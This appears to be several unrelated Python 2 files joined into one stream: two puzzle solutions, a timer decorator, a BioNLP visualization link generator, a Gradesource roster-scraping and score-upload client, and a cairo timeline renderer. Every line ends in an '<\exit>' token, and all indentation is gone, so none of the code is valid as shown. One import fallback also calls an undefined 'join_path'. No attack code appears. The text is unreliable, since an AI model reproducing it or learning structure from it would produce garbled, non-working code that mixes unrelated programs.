class Solution(object):<\exit>
def solve(self, cipher):<\exit>
return len(reduce(lambda x, y: x & y, [set(list(elt)) for elt in cipher]))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
number = int(f.readline().strip())<\exit>
cipher = []<\exit>
for t in xrange(number):<\exit>
cipher.append(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from util.commons_util.logger_utils.timer import Timer<\exit>
def timestamp(func):<\exit>
def ret(*args):<\exit>
timer = Timer()<\exit>
timer.start()<\exit>
result = func(*args)<\exit>
print timer.end()<\exit>
return result<\exit>
return ret<\exit>
def print_func_name(func):<\exit>
def ret(*args):<\exit>
print func.func_name<\exit>
result = func(*args)<\exit>
return result<\exit>
return ret<\exit>
import sys<\exit>
import os<\exit>
try:<\exit>
import argparse<\exit>
except ImportError:<\exit>
from os.path import basename<\exit>
from sys import path as sys_path<\exit>
sys_path.append(join_path(basename(__file__), '../server/lib'))<\exit>
import argparse<\exit>
known_filename_extensions = [".txt", ".a1", ".a2"]<\exit>
def argparser():<\exit>
ap=argparse.ArgumentParser(description="Generate web page linking to visualizations of BioNLP ST documents.")<\exit>
ap.add_argument("-v", "--visualizer", default="visualizer.xhtml", metavar="URL", help="Visualization script")<\exit>
ap.add_argument("-s", "--staticdir", default="static", metavar="DIR", help="Directory containing static visualizations")<\exit>
ap.add_argument("-d", "--dataset", default=None, metavar="NAME", help="Dataset name (derived from directory by default.)")<\exit>
ap.add_argument("directory", help="Directory containing ST documents.")<\exit>
ap.add_argument("prefix", metavar="URL", help="URL prefix to prepend to links")<\exit>
return ap<\exit>
def files_to_process(dir):<\exit>
try:<\exit>
toprocess = []<\exit>
for fn in os.listdir(dir):<\exit>
fp = os.path.join(dir, fn)<\exit>
if os.path.isdir(fp):<\exit>
print >> sys.stderr, "Skipping directory %s" % fn<\exit>
elif os.path.splitext(fn)[1] not in known_filename_extensions:<\exit>
print >> sys.stderr, "Skipping %s: unrecognized suffix" % fn<\exit>
else:<\exit>
toprocess.append(fp)<\exit>
except OSError, e:<\exit>
print >> sys.stderr, "Error processing %s: %s" % (dir, e)<\exit>
return toprocess<\exit>
def print_links(files, arg, out=sys.stdout):<\exit>
grouped = {}<\exit>
for fn in files:<\exit>
root, ext = os.path.splitext(fn)<\exit>
if root not in grouped:<\exit>
grouped[root] = []<\exit>
grouped[root].append(ext)<\exit>
sorted = grouped.keys()<\exit>
sorted.sort()<\exit>
print >> out, "<table>"<\exit>
for root in sorted:<\exit>
path, fn = os.path.split(root)<\exit>
print >> out, "<tr>"<\exit>
print >> out, "  <td>%s</td>" % fn<\exit>
print >> out, "  <td><a href=\"%s\">dynamic</a></td>" % (arg.prefix+arg.visualizer+"#"+arg.dataset+"/"+fn)<\exit>
print >> out, "  <td><a href=\"%s\">svg</a></td>" % (arg.prefix+arg.staticdir+"/svg/"+arg.dataset+"/"+fn+".svg")<\exit>
print >> out, "  <td><a href=\"%s\">png</a></td>" % (arg.prefix+arg.staticdir+"/png/"+arg.dataset+"/"+fn+".png")<\exit>
for ext in known_filename_extensions:<\exit>
if ext in grouped[root]:<\exit>
print >> out, "  <td><a href=\"%s\">%s</a></td>" % (arg.prefix+root+ext, ext[1:])<\exit>
else:<\exit>
print >> out, "  <td>-</td>"<\exit>
print >> out, "</tr>"<\exit>
print >> out, "</table>"<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
if arg.dataset is None:<\exit>
dir = arg.directory<\exit>
while dir[-1] == os.sep:<\exit>
dir = dir[:-1]<\exit>
arg.dataset = os.path.split(dir)[1]<\exit>
print >> sys.stderr, "Assuming dataset name '%s', visualizations in %s" % (arg.dataset, os.path.join(arg.staticdir,arg.dataset))<\exit>
try:<\exit>
files = files_to_process(arg.directory)<\exit>
if files is None or len(files) == 0:<\exit>
print >> sys.stderr, "No files found"<\exit>
return 1<\exit>
print_header()<\exit>
print_links(files, arg)<\exit>
print_footer()<\exit>
except:<\exit>
print >> sys.stderr, "Error processing %s" % arg.directory<\exit>
raise<\exit>
return 0<\exit>
def print_header(out=sys.stdout):<\exit>
print >> out,<\exit>
def print_footer(out=sys.stdout):<\exit>
print >> out,<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main())<\exit>
def drange(start, stop, step):<\exit>
r = start<\exit>
while r<stop:<\exit>
yield r<\exit>
r += step<\exit>
def frange(start, stop, step):<\exit>
return list(drange(start, stop, step))<\exit>
from bs4 import BeautifulSoup<\exit>
import re, requests<\exit>
import csv<\exit>
class GradesourceSession:<\exit>
cookies = None<\exit>
s = requests.session()<\exit>
savedAccount = {}<\exit>
savedPIDAccount = {}<\exit>
savedName = {}<\exit>
savedNamePID = {}<\exit>
def __init__(self, username, password, courseid):<\exit>
s = self.s<\exit>
print("Logging in....")<\exit>
postData = {'User' : username, 'Password' : password}<\exit>
loginPOST = s.post('https://www.gradesource.com/validate.asp', data = postData)<\exit>
if loginPOST.status_code != 200:<\exit>
print("Login failed... Exiting")<\exit>
exit()<\exit>
self.cookies = loginPOST.cookies<\exit>
print("Selecting course %s" % courseid)<\exit>
selectcourseGET = s.get('https://www.gradesource.com/selectcourse.asp?id=%s' % courseid, cookies = self.cookies)<\exit>
self.cookies = selectcourseGET.cookies<\exit>
self.s = s<\exit>
self.email()<\exit>
def updateEmailScore(self, field, CSV, overwrite):<\exit>
s = self.s<\exit>
print("Converting CSV into a list...")<\exit>
reader = csv.reader(open(CSV, 'rU'), delimiter=',')<\exit>
try:<\exit>
scoreDict = dict(reader)<\exit>
except Exception, e:<\exit>
print("oops, your file is malformed, please fix it (check for extra lines)")<\exit>
print(overwrite)<\exit>
if (float(overwrite) == 0):<\exit>
for k,v in scoreDict.items():<\exit>
if (v == "0"):<\exit>
scoreDict[k] = ""<\exit>
print(scoreDict)<\exit>
print("CSV Converted")<\exit>
self.s = s<\exit>
self.updateScores(field, scoreDict)<\exit>
def updatePIDScore(self, field, CSV, overwrite):<\exit>
s = self.s<\exit>
print("Converting CSV into a list...")<\exit>
reader = csv.reader(open(CSV, 'rU'), delimiter=',')<\exit>
try:<\exit>
scoreDict = dict(reader)<\exit>
except Exception, e:<\exit>
print("oops, your file is malformed, please fix it (check for extra lines)")<\exit>
print(scoreDict)<\exit>
if (float(overwrite) == 0):<\exit>
for k,v in scoreDict.items():<\exit>
if (v == "0"):<\exit>
scoreDict[k] = ""<\exit>
updateScore = {}<\exit>
savedPIDAccount = self.savedPIDAccount<\exit>
for key in savedPIDAccount.keys():<\exit>
try:<\exit>
updateScore[key] = scoreDict[savedPIDAccount[key]]<\exit>
except Exception, e:<\exit>
print(savedPIDAccount[key]+ "was unable to be joined and therefore skipped")<\exit>
continue<\exit>
print(updateScore)<\exit>
print("CSV Converted to email")<\exit>
self.s = s<\exit>
self.updateScores(field, updateScore)<\exit>
def updateScores(self, field, scoreDict):<\exit>
s = self.s<\exit>
print("Updating scores...")<\exit>
html = s.get('https://www.gradesource.com/editscores1.asp?id=%s' % field, cookies = self.cookies).content<\exit>
returnOutput = {}<\exit>
totalCount = re.compile('<td nowrap colspan=3 class=BT>&nbsp;&nbsp;Maximum Points: &nbsp;&nbsp;<font color="#336699"><b>(.*)</b></font></td>')<\exit>
maximumScore = totalCount.search(html).group(1).strip()<\exit>
for k,v in scoreDict.items():<\exit>
if (v == ""):<\exit>
value = -1<\exit>
else:<\exit>
value = float(v)<\exit>
maxScore = float(maximumScore)<\exit>
if(value > maxScore):<\exit>
print(k + " has a score of " + v + " which is larger than the maximum score of " + maximumScore)<\exit>
returnOutput[k] = v<\exit>
nomnomsoup = BeautifulSoup(html)<\exit>
updatePOSTDict = {}<\exit>
updateIDDict = {}<\exit>
for x in nomnomsoup.form('input', id = re.compile("^student")):<\exit>
studentNumber = re.compile('input id="(.*)" name=')<\exit>
studentString = studentNumber.search(str(x))<\exit>
studStr = studentString.group(1).strip()<\exit>
gradesourceNumber = re.compile('type="hidden" value="(.*)"')<\exit>
x =  x.findNext("input")<\exit>
gradesourceString = gradesourceNumber.search(str(x))<\exit>
gradStr = gradesourceString.group(1).strip()<\exit>
updatePOSTDict[studStr] = gradStr<\exit>
idNumber = re.compile('input name="id(.*)" type="hidden"')<\exit>
idString = idNumber.search(str(x))<\exit>
idString = "id"+str(idString.group(1).strip())<\exit>
updateIDDict[idString] = gradStr<\exit>
joinedDictA = {}<\exit>
saveAccount = self.savedAccount<\exit>
for key in saveAccount.keys():<\exit>
try:<\exit>
joinedDictA[key] = scoreDict[saveAccount[key]]<\exit>
except Exception, e:<\exit>
print(saveAccount[key] + " was found in Gradesource but not in the CSV.")<\exit>
continue<\exit>
joinedDictB = {}<\exit>
for key in updatePOSTDict.keys():<\exit>
try:<\exit>
joinedDictB[key] = joinedDictA[updatePOSTDict[key]]<\exit>
except Exception, e:<\exit>
print(updatePOSTDict[key] + " was unable to be joined and therefore skipped")<\exit>
continue<\exit>
joinedDictB.update(updateIDDict)<\exit>
joinedDictB['assessmentId'] = field<\exit>
joinedDictB['verifyAccepted'] = 'N'<\exit>
joinedDictB['studentCount'] = str(len(saveAccount))<\exit>
ret = s.post('https://www.gradesource.com/updatescores1.asp', data = joinedDictB, cookies = self.cookies)<\exit>
print "Scores Updated"<\exit>
for k,v in returnOutput.items():<\exit>
print("WARNING: " + k + " HAS A SCORE OF " + v + " WHICH IS LARGER THAN MAX. SCORE INPUTTED. PLEASE CHECK SITE TO CONFIRM")<\exit>
def email(self):<\exit>
s = self.s<\exit>
print("Generating list of students")<\exit>
html = s.get("https://www.gradesource.com/student.asp", cookies = self.cookies).content<\exit>
nomnomsoup = BeautifulSoup(html)<\exit>
tbody = nomnomsoup('td', text=re.compile("Secret*"))[0].parent.parent.parent.parent<\exit>
emailDict = {}<\exit>
emailPIDDict = {}<\exit>
nameDict = {}<\exit>
namePIDDict = {}<\exit>
for tr in tbody('tr'):<\exit>
try:<\exit>
studentNum = tr.contents[9].find('a')['href']<\exit>
studentNum = studentNum.replace("editstudent.asp?id=", "")<\exit>
studentNum = studentNum.encode('ascii')<\exit>
studentEmail = tr.contents[7].text.strip()<\exit>
studentEmail = studentEmail.encode('ascii')<\exit>
studentPID = tr.contents[3].text.strip()<\exit>
studentPID = studentPID.encode('ascii')<\exit>
studentName = tr.contents[1].text.strip()<\exit>
studentName = studentName.encode('ascii')<\exit>
if (str(studentEmail) != "Edit") :<\exit>
emailDict[str(studentNum)] = str(studentEmail)<\exit>
emailPIDDict[str(studentEmail)] = str(studentPID)<\exit>
nameDict[str(studentName)] = str(studentEmail)<\exit>
namePIDDict[str(studentName)] = str(studentPID)<\exit>
except Exception, e:<\exit>
continue<\exit>
self.savedAccount = emailDict<\exit>
print emailDict<\exit>
print "Students List Generated"<\exit>
self.savedName = nameDict<\exit>
self.savedNamePID = namePIDDict<\exit>
self.savedPIDAccount = emailPIDDict<\exit>
self.s = s<\exit>
def downloadEmail(self):<\exit>
print("Creating CSV")<\exit>
writer = csv.writer(open('Roster.csv', 'wb'))<\exit>
for key, value in self.savedName.items():<\exit>
writer.writerow([key,value])<\exit>
print(self.savedName)<\exit>
print("CSV Created")<\exit>
def downloadiClicker(self):<\exit>
print("Creating CSV")<\exit>
writer = csv.writer(open('iClickerRoster.csv', 'wb'), escapechar=' ', quoting=csv.QUOTE_NONE)<\exit>
for key, value in self.savedNamePID.items():<\exit>
writer.writerow([key,value])<\exit>
print("CSV Created")<\exit>
from gradesourcesession import GradesourceSession<\exit>
from getpass import getpass<\exit>
def downloadEmail(login, courseID):<\exit>
gradesource = GradesourceSession(login, getpass('Password: '), courseID)<\exit>
gradesource.downloadEmail()<\exit>
def downloadiClicker(login, courseID):<\exit>
gradesource = GradesourceSession(login, getpass('Password: '), courseID)<\exit>
gradesource.downloadiClicker()<\exit>
def updateScoresByEmail(login, courseID, assignmentID, CSVFile, overwrite):<\exit>
gradesource = GradesourceSession(login, getpass('Password: '), courseID)<\exit>
gradesource.updateEmailScore(assignmentID, CSVFile, overwrite)<\exit>
def updateScoresByPID(login,courseID, assignmentID, CSVFile, overwrite):<\exit>
gradesource = GradesourceSession(login, getpass('Password: '), courseID)<\exit>
gradesource.updatePIDScore(assignmentID, CSVFile, overwrite)<\exit>
def downloadEmailGUI(login, courseID, password):<\exit>
gradesource = GradesourceSession(login, password, courseID)<\exit>
gradesource.downloadEmail()<\exit>
def downloadiClickerGUI(login, courseID, password):<\exit>
gradesource = GradesourceSession(login, password, courseID)<\exit>
gradesource.downloadiClicker()<\exit>
def updateScoresByEmailGUI(login, courseID, assignmentID, CSVFile, password, overwrite):<\exit>
gradesource = GradesourceSession(login, password, courseID)<\exit>
gradesource.updateEmailScore(assignmentID, CSVFile, overwrite)<\exit>
def updateScoresByPIDGUI(login,courseID, assignmentID, CSVFile, password, overwrite):<\exit>
gradesource = GradesourceSession(login, password, courseID)<\exit>
gradesource.updatePIDScore(assignmentID, CSVFile, overwrite)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
m = len(cipher)<\exit>
n = len(cipher[0])<\exit>
cipher = map(lambda x: sorted(x), cipher)<\exit>
for j in xrange(n):<\exit>
for i in xrange(m - 1):<\exit>
if cipher[i][j] > cipher[i + 1][j]:<\exit>
return "NO"<\exit>
return "YES"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
n = int(f.readline().strip())<\exit>
cipher = []<\exit>
for i in xrange(n):<\exit>
cipher.append(list(f.readline().strip()))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import cairo<\exit>
import sys<\exit>
import re<\exit>
import gtk<\exit>
class DataRange:<\exit>
def __init__(self, start = 0, end = 0, value = ''):<\exit>
self.start = start<\exit>
self.end = end<\exit>
self.value = value<\exit>
class EventString:<\exit>
def __init__(self, at = 0, value = ''):<\exit>
self.at = at<\exit>
self.value = value<\exit>
class EventFloat:<\exit>
def __init__(self, at = 0, value = 0.0):<\exit>
self.at = at<\exit>
self.value = value<\exit>
class EventInt:<\exit>
def __init__(self, at = 0, value = 0.0):<\exit>
self.at = at<\exit>
self.value = value<\exit>
def ranges_cmp(a, b):<\exit>
diff = a.start - b.start<\exit>
if diff < 0:<\exit>
return -1<\exit>
elif diff > 0:<\exit>
return +1<\exit>
else:<\exit>
return 0<\exit>
def events_cmp(a, b):<\exit>
diff = a.at - b.at<\exit>
if diff < 0:<\exit>
return -1<\exit>
elif diff > 0:<\exit>
return +1<\exit>
else:<\exit>
return 0<\exit>
class TimelineDataRange:<\exit>
def __init__(self, name = ''):<\exit>
self.name = name<\exit>
self.ranges = []<\exit>
return<\exit>
def __search(self, key):<\exit>
l = 0<\exit>
u = len(self.ranges)-1<\exit>
while l <= u:<\exit>
i = int((l + u) / 2)<\exit>
if key >= self.ranges[i].start and key <= self.ranges[i].end:<\exit>
return i<\exit>
elif key < self.ranges[i].start:<\exit>
u = i - 1<\exit>
else:<\exit>
l = i + 1<\exit>
return - 1<\exit>
def add_range(self, range):<\exit>
self.ranges.append(range)<\exit>
def get_all(self):<\exit>
return self.ranges<\exit>
def get_ranges(self, start, end):<\exit>
s = self.__search(start)<\exit>
e = self.__search(end)<\exit>
if s == -1 and e == -1:<\exit>
return []<\exit>
elif s == -1:<\exit>
return self.ranges[0:e + 1]<\exit>
elif e == -1:<\exit>
return self.ranges[s:len(self.ranges)]<\exit>
else:<\exit>
return self.ranges[s:e + 1]<\exit>
def get_ranges_bounds(self, start, end):<\exit>
s = self.__search(start)<\exit>
e = self.__search(end)<\exit>
if s == -1 and e == -1:<\exit>
return(0, 0)<\exit>
elif s == -1:<\exit>
return(0, e + 1)<\exit>
elif e == -1:<\exit>
return(s, len(self.ranges))<\exit>
else:<\exit>
return(s, e + 1)<\exit>
def sort(self):<\exit>
self.ranges.sort(ranges_cmp)<\exit>
def get_bounds(self):<\exit>
if len(self.ranges) > 0:<\exit>
lo = self.ranges[0].start<\exit>
hi = self.ranges[len(self.ranges)-1].end<\exit>
return(lo, hi)<\exit>
else:<\exit>
return(0, 0)<\exit>
class TimelineEvent:<\exit>
def __init__(self, name = ''):<\exit>
self.name = name<\exit>
self.events = []<\exit>
def __search(self, key):<\exit>
l = 0<\exit>
u = len(self.events)-1<\exit>
while l <= u:<\exit>
i = int((l + u) / 2)<\exit>
if key == self.events[i].at:<\exit>
return i<\exit>
elif key < self.events[i].at:<\exit>
u = i - 1<\exit>
else:<\exit>
l = i + 1<\exit>
return l<\exit>
def add_event(self, event):<\exit>
self.events.append(event)<\exit>
def get_events(self, start, end):<\exit>
s = self.__search(start)<\exit>
e = self.__search(end)<\exit>
return self.events[s:e + 1]<\exit>
def get_events_bounds(self, start, end):<\exit>
s = self.__search(start)<\exit>
e = self.__search(end)<\exit>
return(s, e + 1)<\exit>
def sort(self):<\exit>
self.events.sort(events_cmp)<\exit>
def get_bounds(self):<\exit>
if len(self.events) > 0:<\exit>
lo = self.events[0].at<\exit>
hi = self.events[-1].at<\exit>
return(lo, hi)<\exit>
else:<\exit>
return(0, 0)<\exit>
class Timeline:<\exit>
def __init__(self, name = ''):<\exit>
self.ranges = []<\exit>
self.event_str = []<\exit>
self.event_int = []<\exit>
self.name = name<\exit>
def get_range(self, name):<\exit>
for range in self.ranges:<\exit>
if range.name == name:<\exit>
return range<\exit>
timeline = TimelineDataRange(name)<\exit>
self.ranges.append(timeline)<\exit>
return timeline<\exit>
def get_event_str(self, name):<\exit>
for event_str in self.event_str:<\exit>
if event_str.name == name:<\exit>
return event_str<\exit>
timeline = TimelineEvent(name)<\exit>
self.event_str.append(timeline)<\exit>
return timeline<\exit>
def get_event_int(self, name):<\exit>
for event_int in self.event_int:<\exit>
if event_int.name == name:<\exit>
return event_int<\exit>
timeline = TimelineEvent(name)<\exit>
self.event_int.append(timeline)<\exit>
return timeline<\exit>
def get_ranges(self):<\exit>
return self.ranges<\exit>
def get_events_str(self):<\exit>
return self.event_str<\exit>
def get_events_int(self):<\exit>
return self.event_int<\exit>
def sort(self):<\exit>
for range in self.ranges:<\exit>
range.sort()<\exit>
for event in self.event_int:<\exit>
event.sort()<\exit>
for event in self.event_str:<\exit>
event.sort()<\exit>
def get_bounds(self):<\exit>
lo = 0<\exit>
hi = 0<\exit>
for range in self.ranges:<\exit>
(range_lo, range_hi) = range.get_bounds()<\exit>
if range_lo < lo:<\exit>
lo = range_lo<\exit>
if range_hi > hi:<\exit>
hi = range_hi<\exit>
for event_str in self.event_str:<\exit>
(ev_lo, ev_hi) = event_str.get_bounds()<\exit>
if ev_lo < lo:<\exit>
lo = ev_lo<\exit>
if ev_hi > hi:<\exit>
hi = ev_hi<\exit>
for event_int in self.event_int:<\exit>
(ev_lo, ev_hi) = event_int.get_bounds()<\exit>
if ev_lo < lo:<\exit>
lo = ev_lo<\exit>
if ev_hi > hi:<\exit>
hi = ev_hi<\exit>
return(lo, hi)<\exit>
class Timelines:<\exit>
def __init__(self):<\exit>
self.timelines = []<\exit>
def get(self, name):<\exit>
for timeline in self.timelines:<\exit>
if timeline.name == name:<\exit>
return timeline<\exit>
timeline = Timeline(name)<\exit>
self.timelines.append(timeline)<\exit>
return timeline<\exit>
def get_all(self):<\exit>
return self.timelines<\exit>
def sort(self):<\exit>
for timeline in self.timelines:<\exit>
timeline.sort()<\exit>
def get_bounds(self):<\exit>
lo = 0<\exit>
hi = 0<\exit>
for timeline in self.timelines:<\exit>
(t_lo, t_hi) = timeline.get_bounds()<\exit>
if t_lo < lo:<\exit>
lo = t_lo<\exit>
if t_hi > hi:<\exit>
hi = t_hi<\exit>
return(lo, hi)<\exit>
def get_all_range_values(self):<\exit>
range_values = {}<\exit>
for timeline in self.timelines:<\exit>
for ranges in timeline.get_ranges():<\exit>
for ran in ranges.get_all():<\exit>
range_values[ran.value] = 1<\exit>
return range_values.keys()<\exit>
class Color:<\exit>
def __init__(self, r = 0.0, g = 0.0, b = 0.0):<\exit>
self.r = r<\exit>
self.g = g<\exit>
self.b = b<\exit>
def set(self, r, g, b):<\exit>
self.r = r<\exit>
self.g = g<\exit>
self.b = b<\exit>
class Colors:<\exit>
default_colors = [Color(1, 0, 0), Color(0, 1, 0), Color(0, 0, 1), Color(1, 1, 0), Color(1, 0, 1), Color(0, 1, 1)]<\exit>
def __init__(self):<\exit>
self.__colors = {}<\exit>
def add(self, name, color):<\exit>
self.__colors[name] = color<\exit>
def lookup(self, name):<\exit>
if not self.__colors.has_key(name):<\exit>
self.add(name, self.default_colors.pop())<\exit>
return self.__colors.get(name)<\exit>
class TopLegendRenderer:<\exit>
def __init__(self):<\exit>
self.__padding = 10<\exit>
def set_padding(self, padding):<\exit>
self.__padding = padding<\exit>
def set_legends(self, legends, colors):<\exit>
self.__legends = legends<\exit>
self.__colors = colors<\exit>
def layout(self, width):<\exit>
self.__width = width<\exit>
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)<\exit>
ctx = cairo.Context(surface)<\exit>
line_height = 0<\exit>
total_height = self.__padding<\exit>
line_used = self.__padding<\exit>
for legend in self.__legends:<\exit>
(t_width, t_height) = ctx.text_extents(legend)[2:4]<\exit>
item_width = self.__padding + self.__padding + t_width + self.__padding<\exit>
item_height = t_height + self.__padding<\exit>
if item_height > line_height:<\exit>
line_height = item_height<\exit>
if line_used + item_width > self.__width:<\exit>
line_used = self.__padding + item_width<\exit>
total_height += line_height<\exit>
else:<\exit>
line_used += item_width<\exit>
x = line_used - item_width<\exit>
total_height += line_height<\exit>
self.__height = total_height<\exit>
def get_height(self):<\exit>
return self.__height<\exit>
def draw(self, ctx):<\exit>
i = 0<\exit>
line_height = 0<\exit>
total_height = self.__padding<\exit>
line_used = self.__padding<\exit>
for legend in self.__legends:<\exit>
(t_width, t_height) = ctx.text_extents(legend)[2:4]<\exit>
item_width = self.__padding + self.__padding + t_width + self.__padding<\exit>
item_height = t_height + self.__padding<\exit>
if item_height > line_height:<\exit>
line_height = item_height<\exit>
if line_used + item_width > self.__width:<\exit>
line_used = self.__padding + item_width<\exit>
total_height += line_height<\exit>
else:<\exit>
line_used += item_width<\exit>
x = line_used - item_width<\exit>
ctx.rectangle(x, total_height, self.__padding, self.__padding)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(2)<\exit>
ctx.stroke_preserve()<\exit>
ctx.set_source_rgb(self.__colors[i].r,<\exit>
self.__colors[i].g,<\exit>
self.__colors[i].b)<\exit>
ctx.fill()<\exit>
ctx.move_to(x + self.__padding*2, total_height + t_height)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.show_text(legend)<\exit>
i += 1<\exit>
return<\exit>
class TimelinesRenderer:<\exit>
def __init__(self):<\exit>
self.padding = 10<\exit>
return<\exit>
def get_height(self):<\exit>
return self.height<\exit>
def set_timelines(self, timelines, colors):<\exit>
self.timelines = timelines<\exit>
self.colors = colors<\exit>
def set_render_range(self, start, end):<\exit>
self.start = start<\exit>
self.end = end<\exit>
def get_data_x_start(self):<\exit>
return self.padding / 2 + self.left_width + self.padding + self.right_width + self.padding / 2<\exit>
def layout(self, width):<\exit>
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)<\exit>
ctx = cairo.Context(surface)<\exit>
max_text_height = ctx.text_extents("ABCDEFGHIJKLMNOPQRSTUVWXYZabcedefghijklmnopqrstuvwxyz0123456789")[3]<\exit>
left_width = 0<\exit>
right_width = 0<\exit>
left_n_lines = 0<\exit>
range_n = 0<\exit>
eventint_n = 0<\exit>
eventstr_n = 0<\exit>
for timeline in self.timelines.get_all():<\exit>
left_n_lines += 1<\exit>
t_width = ctx.text_extents(timeline.name)[2]<\exit>
left_width = max(left_width, t_width)<\exit>
for rang in timeline.get_ranges():<\exit>
t_width = ctx.text_extents(rang.name)[2]<\exit>
right_width = max(right_width, t_width)<\exit>
range_n += 1<\exit>
for events_int in timeline.get_events_int():<\exit>
t_width = ctx.text_extents(events_int.name)[2]<\exit>
right_width = max(right_width, t_width)<\exit>
eventint_n += 1<\exit>
for events_str in timeline.get_events_str():<\exit>
t_width = ctx.text_extents(events_str.name)[2]<\exit>
right_width = max(right_width, t_width)<\exit>
eventstr_n += 1<\exit>
left_height = left_n_lines * max_text_height + (left_n_lines - 1) * self.padding<\exit>
right_n_lines = range_n + eventint_n + eventstr_n<\exit>
right_height = (right_n_lines - 1) * self.padding + right_n_lines * max_text_height<\exit>
right_data_height = (eventint_n + eventstr_n) * (max_text_height + 5) + range_n * 10<\exit>
right_data_height += (right_n_lines - 1) * self.padding<\exit>
height = max(left_height, right_height)<\exit>
height = max(height, right_data_height)<\exit>
self.left_width = left_width<\exit>
self.right_width = right_width<\exit>
self.max_text_height = max_text_height<\exit>
self.width = width<\exit>
self.height = height + self.padding<\exit>
def draw_line(self, ctx, x, y, width, height):<\exit>
ctx.move_to(x, y)<\exit>
ctx.rel_line_to(width, height)<\exit>
ctx.close_path()<\exit>
ctx.set_operator(cairo.OPERATOR_SOURCE)<\exit>
ctx.set_line_width(1.0)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
def draw_events(self, ctx, events, x, y, width, height):<\exit>
if (self.grey_background % 2) == 0:<\exit>
ctx.rectangle(x, y - self.padding / 2,<\exit>
width, height + self.padding)<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.fill()<\exit>
last_x_drawn = int(x)<\exit>
(lo, hi) = events.get_events_bounds(self.start, self.end)<\exit>
for event in events.events[lo:hi]:<\exit>
real_x = int(x + (event.at - self.start) * width / (self.end - self.start))<\exit>
if real_x > last_x_drawn + 2:<\exit>
ctx.rectangle(real_x, y, 1, 1)<\exit>
ctx.set_source_rgb(1, 0, 0)<\exit>
ctx.stroke()<\exit>
ctx.move_to(real_x, y + self.max_text_height)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.show_text(str(event.value))<\exit>
last_x_drawn = real_x<\exit>
self.grey_background += 1<\exit>
def draw_ranges(self, ctx, ranges, x, y, width, height):<\exit>
if (self.grey_background % 2) == 0:<\exit>
ctx.rectangle(x, y - self.padding / 2,<\exit>
width, height + self.padding)<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.fill()<\exit>
last_x_drawn = int(x - 1)<\exit>
(lo, hi) = ranges.get_ranges_bounds(self.start, self.end)<\exit>
for data_range in ranges.ranges[lo:hi]:<\exit>
s = max(data_range.start, self.start)<\exit>
e = min(data_range.end, self.end)<\exit>
x_start = int(x + (s - self.start) * width / (self.end - self.start))<\exit>
x_end = int(x + (e - self.start) * width / (self.end - self.start))<\exit>
if x_end > last_x_drawn:<\exit>
ctx.rectangle(x_start, y, x_end - x_start, 10)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke_preserve()<\exit>
color = self.colors.lookup(data_range.value)<\exit>
ctx.set_source_rgb(color.r, color.g, color.b)<\exit>
ctx.fill()<\exit>
last_x_drawn = x_end<\exit>
self.grey_background += 1<\exit>
def draw(self, ctx):<\exit>
timeline_top = 0<\exit>
top_y = self.padding / 2<\exit>
left_x_start = self.padding / 2<\exit>
left_x_end = left_x_start + self.left_width<\exit>
right_x_start = left_x_end + self.padding<\exit>
right_x_end = right_x_start + self.right_width<\exit>
data_x_start = right_x_end + self.padding / 2<\exit>
data_x_end = self.width<\exit>
data_width = data_x_end - data_x_start<\exit>
cur_y = top_y<\exit>
self.draw_line(ctx, 0, 0, self.width, 0)<\exit>
self.grey_background = 1<\exit>
for timeline in self.timelines.get_all():<\exit>
(y_bearing, t_width, t_height) = ctx.text_extents(timeline.name)[1:4]<\exit>
ctx.move_to(left_x_start, cur_y + self.max_text_height - (t_height + y_bearing))<\exit>
ctx.show_text(timeline.name);<\exit>
for events_int in timeline.get_events_int():<\exit>
(y_bearing, t_width, t_height) = ctx.text_extents(events_int.name)[1:4]<\exit>
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))<\exit>
ctx.show_text(events_int.name)<\exit>
self.draw_events(ctx, events_int, data_x_start, cur_y, data_width, self.max_text_height + 5)<\exit>
cur_y += self.max_text_height + 5 + self.padding<\exit>
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,<\exit>
self.right_width + self.padding, 0)<\exit>
for events_str in timeline.get_events_str():<\exit>
(y_bearing, t_width, t_height) = ctx.text_extents(events_str.name)[1:4]<\exit>
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))<\exit>
ctx.show_text(events_str.name)<\exit>
self.draw_events(ctx, events_str, data_x_start, cur_y, data_width, self.max_text_height + 5)<\exit>
cur_y += self.max_text_height + 5 + self.padding<\exit>
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,<\exit>
self.right_width + self.padding, 0)<\exit>
for ranges in timeline.get_ranges():<\exit>
(y_bearing, t_width, t_height) = ctx.text_extents(ranges.name)[1:4]<\exit>
ctx.move_to(right_x_start, cur_y + self.max_text_height - (t_height + y_bearing))<\exit>
ctx.show_text(ranges.name)<\exit>
self.draw_ranges(ctx, ranges, data_x_start, cur_y, data_width, 10)<\exit>
cur_y += self.max_text_height + self.padding<\exit>
self.draw_line(ctx, right_x_start - self.padding / 2, cur_y - self.padding / 2,<\exit>
self.right_width + self.padding, 0)<\exit>
self.draw_line(ctx, 0, cur_y - self.padding / 2,<\exit>
self.width, 0)<\exit>
bot_y = cur_y - self.padding / 2<\exit>
self.draw_line(ctx, left_x_end + self.padding / 2, 0,<\exit>
0, bot_y)<\exit>
